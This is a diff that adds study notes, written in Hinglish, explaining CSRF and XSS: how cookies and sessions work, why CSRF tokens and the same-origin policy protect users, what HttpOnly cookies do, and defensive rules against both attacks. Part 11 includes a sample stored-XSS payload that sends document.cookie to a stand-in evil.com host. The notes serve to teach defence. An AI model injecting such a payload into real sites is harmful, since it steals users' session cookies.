@@ -258,3 +258,332 @@ Ek line ka master rule
 Auto-send credentials (cookie) → CSRF possible
 
 Manual-send credentials (header/localStorage) → CSRF fail
+
+===============================================================================================
+
+# CSRF & XSS – Deep Notes (Core Understanding)
+
+---
+
+## PART 1 — BASIC IDENTITY FLOW
+
+Web security me 2 alag cheezein hoti hain:
+
+1. User kaun hai?  → Identity
+
+   * Session
+   * Session ID
+   * Cookie
+   * JWT
+
+2. Request kisne bheji? → Intent / Authenticity
+
+   * CSRF Token
+
+Cookie / Session batata hai:
+→ Ye Vivek hi hai
+
+CSRF token batata hai:
+→ Request Vivek ne khud bheji hai
+
+---
+
+## PART 2 — COOKIE CORE LOGIC
+
+Cookie browser level pe domain specific hoti hai.
+Tab specific nahi hoti.
+
+Example:
+
+Laptop → Chrome → bank.com login
+
+Browser ke paas:
+sessionId=abc123
+
+Ab:
+
+Tab1 me login kiya
+Tab2 me bank.com open kiya
+
+Browser check karega:
+"Kya mere paas bank.com ki cookie hai?"
+
+Answer:
+→ Haan
+
+To automatically attach kar dega.
+
+Isliye user ko dobara login nahi karna padta.
+
+---
+
+## PART 3 — DIFFERENT DEVICES / BROWSERS
+
+Cookies shared nahi hoti:
+
+Laptop 1 → Chrome → login
+Laptop 2 → Chrome → login again required
+Laptop 1 → Edge → login again required
+
+Reason:
+Har browser ka storage alag hota hai.
+
+---
+
+## PART 4 — CSRF ATTACK CORE LOGIC
+
+CSRF tab hota hai jab:
+
+Browser automatically credentials bhejta hai.
+
+Example flow:
+
+1. User bank.com me login hai
+2. Cookie valid hai
+3. Hacker evil.com ka link bhejta hai
+4. User galti se click karta hai
+5. Evil page bank.com ko request bhejta hai
+6. Browser check karta hai:
+   "Kya mere paas bank.com ki cookie hai?"
+7. Haan → cookie attach ho jati hai
+8. Server sochega:
+   "Valid user hai"
+9. Action perform ho jayega
+
+Yahi CSRF attack hai.
+
+Core issue:
+→ Browser bina puche cookie bhej deta hai.
+
+---
+
+## PART 5 — CSRF TOKEN KA REAL KAAM
+
+CSRF token prove karta hai:
+
+Request real page se hi aayi hai.
+
+Server kya karta hai:
+
+1. User login karta hai
+2. Server ek random CSRF token generate karta hai
+3. Ek copy server pe store hoti hai
+   (session / memory / DB)
+4. Ek copy page me insert hoti hai:
+
+   * hidden form field
+   * JS variable
+   * meta tag
+
+Request jab aati hai:
+
+Server check karta hai:
+
+Token (request) === Token (server)?
+
+Match:
+→ Accept
+
+Mismatch:
+→ Reject
+
+Attacker ke paas token nahi hota.
+
+---
+
+## PART 6 — CSRF TOKEN KAHAN STORE HOTA HAI
+
+Server side:
+
+* Session me
+* Memory me
+* Kabhi DB me
+
+Client side:
+
+* Page ke andar embed hota hai
+* Form field
+* JS variable
+* Meta tag
+
+Important:
+Token cookie jaisa auto-send nahi hota.
+User ka real page hi token send karta hai.
+
+---
+
+## PART 7 — KYUN EVIL.COM TOKEN NAHI PADH SAKTA
+
+Same Origin Policy:
+
+evil.com:
+
+* bank.com ka page read nahi kar sakta
+* bank.com ka JS variable nahi dekh sakta
+* bank.com ka meta tag nahi padh sakta
+
+Isliye token chori nahi hota.
+
+---
+
+## PART 8 — JWT STORAGE & CSRF
+
+JWT agar cookie me rakha:
+
+→ Browser auto send karega
+→ CSRF risk
+
+JWT agar localStorage me rakha:
+
+→ Browser auto send nahi karega
+→ JS manually header me bhejega
+→ CSRF risk nahi
+
+---
+
+## PART 9 — LOCALSTORAGE VS COOKIE
+
+localStorage:
+
+* Domain specific
+* Auto send nahi hota
+
+Cookie:
+
+* Domain specific
+* Auto send hota hai
+
+Isi auto-send ki wajah se CSRF hota hai.
+
+---
+
+## PART 10 — HTTPONLY COOKIE
+
+HttpOnly ka matlab:
+
+JavaScript cookie read nahi kar sakti.
+
+Example:
+
+document.cookie
+→ HttpOnly cookie nahi dikhegi
+
+Protection:
+→ XSS se bachata hai
+
+Lekin:
+
+Browser fir bhi cookie send karega.
+
+Isliye:
+→ CSRF se nahi bachata
+
+---
+
+## PART 11 — XSS ATTACK CORE LOGIC
+
+XSS me hacker:
+
+Website ke andar JS inject kar deta hai.
+
+Example:
+
+Comment box me likh diya:
+
+<script>
+fetch("https://evil.com/steal?c=" + document.cookie)
+</script>
+
+Server usko save kar leta hai.
+
+Jab koi user page open karega:
+
+Browser script run karega.
+
+Hacker:
+→ Cookie chura lega
+→ Session hijack kar lega
+
+---
+
+## PART 12 — HTTPONLY VS XSS
+
+Agar cookie HttpOnly ho:
+
+document.cookie
+→ empty
+
+Cookie chori nahi hogi.
+
+But:
+
+Hacker user ke browser se actions kara sakta hai.
+
+---
+
+## PART 13 — CSRF VS XSS DIFFERENCE
+
+CSRF:
+
+* Browser auto cookie bhejta hai
+* Attacker request karwata hai
+
+XSS:
+
+* Hacker JS inject karta hai
+* Browser control me le leta hai
+
+---
+
+## PART 14 — TYPES OF XSS
+
+1. Stored XSS
+
+   * DB me save
+   * Sab users affect
+
+2. Reflected XSS
+
+   * URL se inject
+
+3. DOM XSS
+
+   * Frontend JS manipulation
+
+---
+
+## PART 15 — XSS SE BACHNE KE RULES
+
+1. User input sanitize karo
+2. Raw HTML render mat karo
+3. HttpOnly cookies use karo
+4. CSP (Content Security Policy)
+5. Output encoding
+
+---
+
+## PART 16 — CSRF SE BACHNE KE RULES
+
+1. CSRF token use karo
+2. SameSite cookies use karo
+3. Sensitive action me POST use karo
+4. Origin / Referer verify karo
+
+---
+
+## FINAL CORE SUMMARY
+
+Cookie / Session:
+→ Kaun user hai
+
+CSRF Token:
+→ Request kisne bheji
+
+HttpOnly:
+→ JS se cookie protect
+
+XSS:
+→ JS injection
+
+CSRF:
+→ Auto cookie misuse
